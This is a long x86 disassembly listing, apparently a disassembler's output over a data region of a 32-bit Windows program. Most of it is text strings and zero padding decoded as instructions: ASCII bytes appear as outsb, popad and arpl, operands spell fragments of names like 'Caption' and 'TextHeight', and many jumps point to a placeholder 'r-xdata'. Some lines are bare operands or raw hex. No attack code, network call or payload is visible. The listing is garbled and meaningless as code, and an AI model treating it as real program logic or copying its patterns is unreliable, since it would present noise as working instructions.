add [ eax + 0x42080011 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x465646f
xchg esi eax
inc ecx
add [ eax ] dl
add al [ eax ]
call esp
fild [ ecx ]
xor ah ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
adc al [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
jb r-xdata
add [ fs : eax ] al
jmp [ eax + eax ]
imul ebp [ edi + 0x6e ] r-xdata
mov al 0xc2
inc edx
jb r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
inc esp
add [ ecx + eax ] bh
dec [ ebx + ecx * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push ebp
jae r-xdata
adc al 0xce
inc eax
add [ eax ] ah
add bh bh
mov ah cl
inc edx
add [ eax ] al
rol [ ecx ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
inc ecx
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
in al dx
add [ ebx ] cl
inc edx
outsd
add [ ecx ] 0x11
add al [ eax ]
call [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x44a58874
add [ edx + eax * 8 + 0x42 ] bl
add [ esi + edx * 8 + 0x41 ] bh
add [ eax ] al
adc [ esi ] 0x0
or al 0x43
jb r-xdata
jo r-xdata
jb r-xdata
add [ eax ] dh
in al 0x41
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc eax [ eax ]
or eax [ edx + 0x6f ]
add [ ecx ] ah
add [ edx ] cl
push eax
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
dec ebp
add [ eax ] al
[ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
xchg esi eax
inc ecx
add [ ecx ] bl
add al [ eax ]
[ ecx ]
add al [ eax ]
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
inc esp
popa
jne r-xdata
add ah cl
salc
je r-xdata
add ah al
int3
leave
inc edx
add [ edx + ecx * 8 ] ch
inc edx
add [ eax ] dh
in al 0x41
add [ eax ] al
inc edx
add ah ch
imul esp [ gs : edi + 0x68 ] 0x44953074
outsb
je r-xdata
add [ eax ] al
and [ edx ] 0x0
add al 0x46
dec ebp
outsd
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] cl
push ds
add [ eax ] cl
inc esp
jb r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ ecx + eax ] al
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ eax ] bh
add [ eax ] eax
[ ecx + ecx * 2 ]
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
add eax 0x336c7443
inc esp
dec esp
movsd [ edi ] [ esi ]
je r-xdata
jl r-xdata
insb
rol [ gs : ebx + 0x12c0042 ] 0x1
add bh bh
loopne r-xdata
dec ecx
imul ebp [ ebp + 0x2c ] 0xf000417f
add [ eax ] eax
jmp [ eax + 0x300041ba ]
add [ edx + eax ] ah
add bh bh
and al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or [ eax + 0x65 ] cl
insb
jo r-xdata
mov [ ebp + 0x3c0044 ] ah
outsd
outsb
je r-xdata
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d0009 ] al
outsd
jb r-xdata
xchg ebp eax
inc ecx
add [ edi ] dl
add al [ eax ]
inc [ esp - 0x1bcfffbf ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ esi + 0x6f ] eax
jb r-xdata
ja r-xdata
inc [ edx + ebp ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x6f440800
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x2c ] 0x8b004278
add [ eax ] al
dec [ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] sub_44a54c
inc esp
add [ eax ] eax
inc ecx
add [ eax ] al
rol [ ecx ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ ebx + eax * 2 ] cl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
inc eax
add [ eax + 0x2 ] cl
add bh bh
jb r-xdata
xchg ebp eax
inc esp
outsd
outsb
je r-xdata
rol [ eax ] 0x1
pop eax
add [ eax ] al
push [ ebx + ecx * 8 ]
inc edx
add [ ebx + ecx * 8 + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040022 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push cs
dec edi
insb
inc ebx
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
jb r-xdata
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ ecx ] cl
add bh bh
mov esp 0x10042cb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
or dl [ eax + 0x61 ]
pop ds
add [ eax ] cl
inc esp
jb r-xdata
add [ ebp ] cl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
add [ eax + 0x430b0017 ] al
add [ esi ] cl
dec edi
bound ebp [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d002b ] al
imul edi [ eax + 0x65 ] 0x6550736c
popad
je r-xdata
add [ es : edx ] cl
dec ebx
jns r-xdata
add [ eax ] al
arpl [ edi + 0x6e ] bp
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ 0x15ff0002 ] dl
add al [ eax ]
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
fild [ eax ]
sub [ edx ] al
add bh bh
or al 0xe4
inc ecx
add [ esp + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49040025 ] al
add bh bh
test al 0xbf
inc edx
add [ eax ] ah
rol [ ecx ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x44953074
insb
mov [ gs : ebp + 0x3c0044 ] ah
js r-xdata
je r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
outsb
add al 0x97
inc ecx
outsb
arpl [ eax - 0x8 ] bp
bound eax [ eax ]
insb
add [ eax ] al
inc [ eax + 0x300042c9 ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
jb r-xdata
push eax
jb r-xdata
add [ eax ] al
add [ esi ] ch
add [ edx ] cl
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x5009002c ] al
outsd
jo r-xdata
insd
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ eax ] dl
add bh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ ecx * 2 + 0x4c756e65 ] al
movsd [ edi ] [ esi ]
inc esp
add [ edx + eax ] bl
add bh bh
sbb al 0x2
add bh bh
add [ eax ] eax
pushad
inc eax
add [ eax ] dh
add al [ eax ]
[ esi + 0x41 ]
je r-xdata
outsb
je r-xdata
jo r-xdata
add [ 0x1dff0002 ] bl
add al [ eax ]
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edx ] cl
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or eax 0x65786950
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax 0x6f500800
outsb
je r-xdata
0xe4300041 0x41
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] dh
in al 0x41
arpl [ ecx + 0x6c ] sp
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ eax ] bh
jmp 0xffffffffe999785c
outsb
jne r-xdata
jb r-xdata
pop ebx
dec eax
imul ebp [ esi + 0x74 ] r-xdata
hlt
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x4fffbe18 ] al
call sub_4177cc
add [ eax ] dh
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ edi ] al
add bh bh
sbb al 0xd7
add [ eax + 0x2 ] al
add bh bh
sub dh ah
inc ecx
add [ eax ] dh
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a0033 ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
push ebx
jae r-xdata
xchg esi eax
inc ecx
outsb
je r-xdata
outsd
add [ eax ] al
[ eax + 0x30ff0000 ]
je r-xdata
or dl [ edi + 0x69 ]
outsb
outsd
ja r-xdata
movsd [ edi ] [ esi ]
inc ebx
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
inc ecx
add [ ecx + esi * 8 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] eax
pop es
push esi
add [ eax ] al
[ edi + edx * 8 ]
jg r-xdata
add [ eax ] al
xor [ 0x6e4f0b00 ] 0x43
je r-xdata
hlt
jne r-xdata
outsb
xor ah ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add bh bh
imul esi [ ebx + 0x69 ] 0x88656c62
movsd [ edi ] [ esi ]
inc esp
add [ eax ] bh
add [ eax ] al
[ edi + edi * 4 + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000a ] al
jb r-xdata
add ah dh
add [ eax ] eax
inc esp
mov edx 0xe4300041
inc ecx
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
dec edi
je r-xdata
inc ebx
insb
outsd
jae r-xdata
je r-xdata
xor ah ah
inc ecx
jb r-xdata
push ecx
hlt
outsb
inc ebx
add [ eax ] 0x0
add [ eax + 0x4f0b0035 ] al
inc eax
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
push cs
dec edi
outsb
inc ebx
adc [ edi + 0x2800041 ] 0x0
inc [ eax + 0x30ff0002 ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0038 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
inc edx
add [ eax - 0x57010000 ] ch
add [ eax ] al
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 ] cl
popad
je r-xdata
hlt
sar [ esi + 0x42 ] 0x1
add [ eax - 0x4f010000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130039 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax + 0x4f09003d ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08003b ] al
outsb
inc ebx
jb r-xdata
add al [ eax ]
push [ eax ]
in al 0x41
push ecx
dec edi
nop
jl r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
hlt
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
rol [ edx ] 0x0
inc eax
add al [ eax ]
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
outsb
inc esp
jb r-xdata
mov eax 0xd000427b
jb r-xdata
add [ eax - 0x7700fffe ] cl
add al [ eax ]
push [ eax ]
in al 0x41
push eax
outsd
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d0044 ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
imul ecx [ edi + 0x76 ] 0x65
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003f ] al
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
jbe r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c003e ] al
mov [ edx ] al
add bh bh
xor ah ah
inc ecx
jo r-xdata
add bh bh
xor ah ah
inc ecx
imul esi [ ebp + 0x49 ] 0xf46f666e
movsd [ edi ] [ esi ]
inc ebx
add [ eax - 0x6700fffe ] bl
add al [ eax ]
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060045 ] al
outsb
outsw
hlt
jo r-xdata
jpo r-xdata
jb r-xdata
jo r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
inc esp
jae r-xdata
add [ ecx ] cl
dec edi
movsd [ edi ] [ esi ]
inc ebx
outsd
outsb
je r-xdata
movsd [ edi ] [ esi ]
inc ebx
add [ eax - 0x4700fffe ] bh
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
outsb
dec edi
jpe r-xdata
jge r-xdata
cld
jpo r-xdata
dec edi
jbe r-xdata
add [ eax ] al
call eax
add [ eax ] al
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0041 ] al
add al dl
jl r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ edx ] cl
dec edi
jl r-xdata
dec eax
imul esp [ ebp + 0x18 ] 0x900043a6
add al [ eax ]
call [ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060046 ] al
outsb
dec eax
insb
jo r-xdata
add [ eax - 0x5700ffff ] ch
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x0 0xff
xor ah ah
inc ecx
jo r-xdata
jpe r-xdata
sbb [ ebx + 0x42 ] bh
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
dec ebx
jns r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090047 ] al
outsb
dec ebx
jns r-xdata
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
push [ eax ]
in al 0x41
outsd
arpl [ ebx - 0x4 ] bp
inc esp
add al bl
add [ eax ] al
inc ebp
add [ esi ] al
inc ebp
outsb
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090043 ] al
outsb
add [ eax - 0x6f00ffff ] dl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0040 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
outsd
jne r-xdata
push ebp
jo r-xdata
outsb
jpe r-xdata
jne r-xdata
add al al
add [ eax ] al
inc eax
add [ eax ] al
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004b ] al
rol [ eax ] 0x0
outsb
dec ebp
outsd
dec edi
jae r-xdata
movsd [ edi ] [ esi ]
inc ebx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060053 ] al
outsb
push ebx
push 0x7db8776f
inc edx
add al ch
add [ eax ] al
push edi
push 0x556c6565
jo r-xdata
insb
inc esp
jg r-xdata
outsd
ja r-xdata
push 0x446c6565
dec ebp
outsd
jbe r-xdata
jne r-xdata
add [ eax - 0x47010000 ] bh
add [ eax ] al
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004a ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004c ] al
outsb
dec ebp
outsd
add [ eax ] al
dec eax
add [ eax ] al
push [ eax ]
in al 0x41
fdivr [ edx + 0x42 ]
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070049 ] al
movsd [ edi ] [ esi ]
inc ebx
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
push [ eax ]
in al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070050 ] al
mov esp 0xa8004197
add al [ eax ]
[ eax + 0x1ff0002 ]
sar [ edi + 0x42 ] 0x0
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
add [ esi ] cl
outsd
jne r-xdata
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c004d ] al
outsb
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
and al 0x7a
inc edx
add al cl
dec ebp
insb
sar [ edi + 0x42 ] 0x0
rol [ ecx ] 0x1
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esi
add [ eax ] dl
dec edi
inc esp
outsd
ja r-xdata
add bh bh
loopne r-xdata
jae r-xdata
push edi
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
loopne r-xdata
add [ edi ] al
dec edi
push edi
push 0xc06c6565
jg r-xdata
mov [ edx + 0x42 ] bh
add bh bh
xor ah ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080051 ] al
outsb
push edx
je r-xdata
jpe r-xdata
dec edi
outsb
dec ebp
push cs
outsb
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10004e ] al
insd
jae r-xdata
outsd
arpl [ ebx + 0x5c ] bp
jge r-xdata
popad
jb r-xdata
add [ esi + edi * 2 ] bl
inc ecx
add [ ebx ] al
or dl [ esp + edx * 2 + 0x69 ]
insd
jb r-xdata
sbb al 0x7e
add al ah
add [ eax ] eax
jmp eax
nop
dec eax
jle r-xdata
inc esp
popad
jb r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bl
jle r-xdata
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ esi ] cl
nop
outsb
arpl [ ebx ] ax
add [ eax ] eax
add [ eax ] al
add [ esi ] al
je r-xdata
dec eax
add [ eax ] al
add [ eax - 0x54 ] ch
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x30 ] 0xcc
inc ebx
add [ eax ] dl
into
je r-xdata
add [ edx ] al
add [ eax ] al
add [ eax + 0x900417e ] al
jae r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
xchg ebp eax
inc esp
add [ eax ] bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ 0x72635354 ] ecx
outsd
insb
insb
inc edx
inc ebx
outsd
inc esp
test eax 0x54110041
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
jg r-xdata
push edx
jne r-xdata
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
push ebx
push 0x7406776f
insd
dec eax
imul esp [ ebp - 0x70 ] r-xdata
push cs
add [ ecx ] 0x0
outsd
insb
push ebx
inc ebx
add [ esi + ecx * 8 ] ch
inc ebx
add [ ecx + ebp * 4 + 0x41 ] al
adc dh cl
insb
add [ gs : eax ] eax
add [ eax ] al
outsb
adc [ ebx + eax * 2 + 0x6f ] edx
insb
insb
inc edx
popad
outsd
add [ eax ] cl
add [ eax ] al
push 0x940043ac
retn 0x44
add [ ecx ] dl
push esp
inc ecx
popad
jb r-xdata
je r-xdata
jle r-xdata
nop
or al 0x7f
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jg r-xdata
popad
nop
xor [ edi + 0x41 ] bh
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
or dh [ ebx + 0x73 ]
jae r-xdata
popad
outsb
dec esp
outsd
insb
outsd
jb r-xdata
outsb
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] ch
add bh bh
les esi [ ecx + 0x10041 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
[ eax ]
add [ eax ] al
add [ eax + 0x8 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
arpl [ edx + 0x6f ] si
inc esi
insb
popad
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
mov [ ebp + 0x300044 ] ah
add bh bh
sub al 0xb3
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
cwde
mov bl 0x41
add [ ecx ] al
jb r-xdata
adc al 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] cl
add bh bh
cld
mov cl 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ edx ] bl
add [ eax ] al
[ edx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
jb r-xdata
jg r-xdata
je r-xdata
arpl [ ebx - 0x70 ] bp
jae r-xdata
add [ eax - 0x57ffbb3e ] ch
push ss
inc ebx
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax - 0x3c ] 0xb7
inc ecx
add [ eax + 0x55 ] ch
inc ebx
add [ eax ] dh
jecxz r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + eax * 4 ] dl
inc ecx
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] bl
add bh bh
xchg esp eax
mov ah 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
nop
nop
sbb [ ecx + 0xc030041 ] al
push esp
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
mov [ gs : ebp + 0x380044 ] ah
add bh bh
shl [ ebx + 0x10041 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ eax ] al
je r-xdata
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
inc esp
add eax 0x6f6c6f43
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
test [ ecx + 0x10041 ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0x7fffffec ] al
add [ eax ] eax
imul ebp [ esi + 0x4c ] 0x2c0044a5
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ 0x6f460500 ] cl
jb r-xdata
dec eax
outsd
je r-xdata
mov eax 0xb8500042
inc edx
add [ ebx + esi * 8 - 0xc27ffbe ] dl
inc edx
add [ edx + edi * 4 - 0x3773ffbe ] dh
inc edx
add ah cl
mov [ edx ] sub_42cd20
cwde
0x42
add [ ecx * 8 - 0xe8bffbd ] cl
inc edx
add ah cl
mov ebx 0xfa300042
inc edx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
int 0x43
add [ ecx + esi * 8 + 0x42 ] dh
dec esi
outsd
jb r-xdata
[ eax + 0x10041b3 ]
movsd [ edi ] [ esi ]
inc esp
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
outsd
outsb
mov [ ebp + 0x100044 ] ah
add bh bh
inc eax
mov ah 0x41
add [ eax - 0x4c ] dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
dec esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + 0x240044a5 ] cl
add [ eax ] al
[ eax ]
mov cl 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
mov cl 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsd
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp - 0x48c3ffbc ] bl
inc ecx
add [ edi + ecx * 2 + 0x43 ] bl
add [ eax - 0x7bffbcab ] ch
push esp
inc ebx
add [ eax + ecx * 2 ] dh
inc ebx
add [ eax + 0x48 ] ch
inc ebx
add [ eax + 0x44 ] bh
inc ebx
add [ eax ] bh
mov esp 0x840042c6
sub al 0x44
insd
imul edi [ edx + 0x65 ] 0x4181a064
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4182 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7e ] ah
inc ecx
add [ esi + 0x4004182 ] al
add al [ eax ]
add [ eax ] ah
test [ edx ] al
cmp al 0x2c
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
sub_4183a0
